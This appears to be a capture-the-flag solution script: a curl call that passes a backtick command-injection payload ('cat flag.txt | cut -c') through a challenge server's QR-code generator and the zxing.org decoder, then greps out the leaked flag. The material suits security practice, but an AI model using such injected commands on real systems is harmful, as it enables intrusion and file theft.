curl -s https://zxing.org/w/decode?u=http%3A%2F%2Fchalls.houseplant.riceteacatpanda.wtf%3A30004%2Fqr%3Ftext%3D%2560cat%2520flag.txt%2520%257C%2520cut%2520-c%2520{1..34}%2560 > qrcode.txt
grep -o "Raw text[a-zA-Z0-9<>/_{}?]*<" qrcode.txt | sed 's/Raw text<\/td><td><pre>//g' | sed 's/<\/pre><\/td><\/tr><tr><//g' | rev | cut -c 1- | rev | tr -d '\n'
